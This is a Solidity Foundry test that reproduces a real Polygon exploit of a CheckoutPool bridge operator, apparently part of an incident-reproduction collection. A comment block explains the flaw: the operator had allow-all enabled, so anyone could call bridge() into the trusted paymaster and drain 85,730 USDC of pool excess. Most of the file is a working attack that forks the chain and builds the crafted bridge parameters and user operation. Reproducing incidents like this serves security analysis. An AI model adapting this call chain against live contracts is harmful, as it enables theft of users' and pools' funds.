// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 85,730 USDC
// Attacker : 0x6ff2be5d0e5b3974a818731e3ff6eeec8cd9d970
// Attack Contract : 0x9a5fe6e6a27f7eace0782b89e6b216849d871e4f
// Vulnerable Contract : 0x13046f513802de93f3fc48f0cdb2cb7df22ec01a
// Attack Tx : https://polygonscan.com/tx/0x957bcfa47657a198b683feb455f7957e8e6d912b5584a5af510f4ff8a41f4f5a

// @Info
// Vulnerable Contract Code : unverified on Polygonscan

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2034532547191820390
//
// An old CheckoutPool bridge operator contract had _ALLOW_ALL_ enabled and no effective operator gate on bridge().
// Any caller could route bridge() into the trusted CheckoutPaymaster, which activated and called CheckoutPool.execute().
// CheckoutPool then paid the stored checkout target amount from its USDC balance, spending pool excess for the portion
// above the checkout's held amount.

address constant TX_SENDER = 0x6fF2bE5D0E5B3974a818731E3FF6EEEc8cd9D970;
address constant ATTACK_CONTRACT = 0x9A5fe6e6A27f7eacE0782b89e6b216849d871E4f;
address constant ATTACK_ACCOUNT = 0xB648db3bD2f7646D648570CF5765495D46011Ae1;

address constant OLD_BOC = 0x13046f513802De93f3fC48f0cDb2Cb7df22Ec01A;
address constant CHECKOUT_POOL = 0x1929347E025D4F5F8D6B2Bd2261e2f4EfcAcd215;
address constant CHECKOUT_PAYMASTER = 0xD649aC385EfE8CE69EcE9D2E61aE602e2893C586;
address constant ENTRY_POINT = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
address constant USDC_TOKEN = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;

struct BridgeParams {
    address target;
    address spender;
    bytes callData;
    address bridgeReceivedAsset;
    uint256 minBridgeReceivedAmount;
}

struct UserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    uint256 callGasLimit;
    uint256 verificationGasLimit;
    uint256 preVerificationGas;
    uint256 maxFeePerGas;
    uint256 maxPriorityFeePerGas;
    bytes paymasterAndData;
    bytes signature;
}

struct CheckoutParams {
    bytes32 userOpHash;
    bytes32 targetAsset;
    uint96 targetChainId;
    uint128 targetAmount;
    uint128 expiration;
    bytes32 recipient;
}

struct CheckoutState {
    CheckoutParams params;
    address heldAsset;
    uint256 heldAmount;
}

interface IOldBridgeOperator {
    function bridge(address depositAddress, BridgeParams calldata bridgeParams) external;
    function _ALLOW_ALL_() external view returns (bool);
}

interface ICheckoutPaymaster {
    function activateAndCall(address target, bytes calldata callData) external payable returns (bytes memory);
    function isOperatorAllowed(address operator) external view returns (bool);
}

interface ICheckoutPool {
    function execute(address depositAddress, UserOperation[] calldata ops) external;
    function getCheckout(address depositAddress) external view returns (CheckoutState memory);
    function _POOL_EXCESS_(address asset) external view returns (uint256);
}

interface IEntryPoint {
    function getUserOpHash(UserOperation calldata userOp) external view returns (bytes32);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IOldBridgeOperator private constant oldBoc = IOldBridgeOperator(OLD_BOC);
    ICheckoutPool private constant checkoutPool = ICheckoutPool(CHECKOUT_POOL);
    ICheckoutPaymaster private constant paymaster = ICheckoutPaymaster(CHECKOUT_PAYMASTER);
    IEntryPoint private constant entryPoint = IEntryPoint(ENTRY_POINT);

    function setUp() public {
        uint256 forkBlock = 84_291_586;
        vm.createSelectFork("polygon", forkBlock);
        fundingToken = USDC_TOKEN;

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(ATTACK_CONTRACT, "Attack contract / deposit address");
        vm.label(ATTACK_ACCOUNT, "Attacker smart account");
        vm.label(OLD_BOC, "Old CheckoutPool BOC");
        vm.label(CHECKOUT_POOL, "CheckoutPool");
        vm.label(CHECKOUT_PAYMASTER, "CheckoutPaymaster");
        vm.label(ENTRY_POINT, "ERC-4337 EntryPoint");
        vm.label(USDC_TOKEN, "USDC");
    }

    function testExploit() public balanceLog2(ATTACK_ACCOUNT) {
        UserOperation[] memory ops = _buildObservedUserOp();
        CheckoutState memory checkoutBefore = checkoutPool.getCheckout(ATTACK_CONTRACT);
        uint256 attackerUsdcBefore = usdc.balanceOf(ATTACK_ACCOUNT);
        uint256 poolUsdcBefore = usdc.balanceOf(CHECKOUT_POOL);
        uint256 excessBefore = checkoutPool._POOL_EXCESS_(USDC_TOKEN);

        uint256 executionAmount = uint256(checkoutBefore.params.targetAmount);
        uint256 heldAmount = checkoutBefore.heldAmount;
        uint256 excessSpend = executionAmount - heldAmount;

        assertTrue(oldBoc._ALLOW_ALL_(), "old BOC allow-all disabled");
        assertTrue(paymaster.isOperatorAllowed(OLD_BOC), "old BOC is not paymaster operator");
        assertEq(address(uint160(uint256(checkoutBefore.params.targetAsset))), USDC_TOKEN, "unexpected target asset");
        assertEq(checkoutBefore.heldAsset, USDC_TOKEN, "unexpected held asset");
        assertEq(entryPoint.getUserOpHash(ops[0]), checkoutBefore.params.userOpHash, "userOp hash mismatch");
        assertGt(executionAmount, heldAmount, "checkout does not spend pool excess");

        // step 1: call the old BOC directly as an unprivileged attacker-controlled EOA.
        vm.startPrank(TX_SENDER, TX_SENDER);
        oldBoc.bridge(ATTACK_CONTRACT, _buildBridgeParams(ops));
        vm.stopPrank();

        // step 2: CheckoutPool paid the target amount and charged the excess portion to pool accounting.
        assertEq(usdc.balanceOf(ATTACK_ACCOUNT) - attackerUsdcBefore, executionAmount, "unexpected USDC received");
        assertEq(poolUsdcBefore - usdc.balanceOf(CHECKOUT_POOL), executionAmount, "pool balance delta mismatch");
        assertEq(excessBefore - checkoutPool._POOL_EXCESS_(USDC_TOKEN), excessSpend, "pool excess delta mismatch");

        emit log_named_decimal_uint("USDC transferred to attacker smart account", executionAmount, 6);
        emit log_named_decimal_uint("USDC excess consumed", excessSpend, 6);
    }

    function _buildBridgeParams(
        UserOperation[] memory ops
    ) private pure returns (BridgeParams memory bridgeParams) {
        bytes memory executeCall = abi.encodeWithSelector(ICheckoutPool.execute.selector, ATTACK_CONTRACT, ops);
        bytes memory activateAndCall =
            abi.encodeWithSelector(ICheckoutPaymaster.activateAndCall.selector, CHECKOUT_POOL, executeCall);

        bridgeParams = BridgeParams({
            target: CHECKOUT_PAYMASTER,
            spender: ATTACK_CONTRACT,
            callData: activateAndCall,
            bridgeReceivedAsset: USDC_TOKEN,
            minBridgeReceivedAmount: 0
        });
    }

    function _buildObservedUserOp() private pure returns (UserOperation[] memory ops) {
        ops = new UserOperation[](1);
        ops[0] = UserOperation({
            sender: ATTACK_ACCOUNT,
            nonce: 1,
            initCode: "",
            callData: "",
            callGasLimit: 62_646,
            verificationGasLimit: 75_826,
            preVerificationGas: 51_638,
            maxFeePerGas: 189_054_399_157,
            maxPriorityFeePerGas: 49_500_000_000,
            paymasterAndData: abi.encodePacked(ATTACK_ACCOUNT, bytes7(0)),
            signature: new bytes(32)
        });
    }
}
